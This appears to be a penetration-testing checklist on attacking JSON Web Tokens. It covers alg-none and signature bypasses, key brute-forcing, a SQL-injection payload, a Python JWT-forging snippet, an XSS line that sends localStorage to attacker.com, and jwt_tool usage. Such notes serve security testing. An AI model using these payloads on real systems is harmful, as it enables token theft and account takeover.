---
description: Json Web Token Vulnerabilities
---

# JWT

### Type of tokens

* **IdToken:** If you obtain an IdToken, you can use it to authenticate and impersonate the victim.
* **accessToken:** If you obtain an accessToken, you can use it to generate a new IdToken with the help of the authentication endpoint.

### Type of attacks

* [ ] Use alg "none", "None", "NoNe" and remove the signature.
* [ ] Check the expiration of the JWT (may be too high?)
* [ ] Maybe no signature verification. Try changing the data and maintain the signature.
* [ ] [Brute-force the key](../../misc/password-cracking/hashcat.md#jwt-16500) (when symmetric)
* [ ] Try injections like sql $'{"login":"admin \\' or \\'a'=\\'a"}'&#x20;

### Brute-forcing weak key

When the encryption is symmetric (like HS256), we can try to [brute-force the key](../../misc/password-cracking/hashcat.md#jwt-16500). If we find the valid key, we can forge a valid JWT token using python:

{% code overflow="wrap" %}
```python
import jwt 

jwt_token = jwt.encode( {'username':'admin','iat':'123123'}, key='EncryptionPassword', algorithm='HS256') 
jwt_token = jwt_token.decode("UTF-8") 

print(jwt_token) 
```
{% endcode %}

### Stealing JWT through XSS

If the JWT token is stored in the "localStorage" or "sessionStorage", we can get it with an XSS attack:

```javascript
<img src='https://attacker.com/test?jwt='+JSON.stringify(localStorage);' --!> 
```

Depending on the target implementation, this will more than likely provide you with an IdToken, accessToken and many other associated tokens. The IdToken would be used to authenticate and masquerade as the user in question (essentially an account-takeover) and the accessToken can be used to generate a brand new IdToken with the authentication endpoint.

### Tool - jwt-pwn

Run [jwt-pwn](https://github.com/mazen160/jwt-pwn). Most reliable tool with different types of attacks.&#x20;

{% embed url="https://github.com/mazen160/jwt-pwn" %}
jwt-pwn github page.
{% endembed %}

### Tool - jwt-tool

Run [jwt\_tool](https://github.com/ticarpi/jwt\_tool) with all checks and wait for green lines:&#x20;

{% code overflow="wrap" %}
```bash
python3 jwt_tool.py -M at -t "https://api.example.com/api/v1/user/123" -rh "Authorization: Bearer eyJhbG...<JWT Token>" 
```
{% endcode %}

{% embed url="https://github.com/ticarpi/jwt_tool" %}
jwt\_tool github page.
{% endembed %}
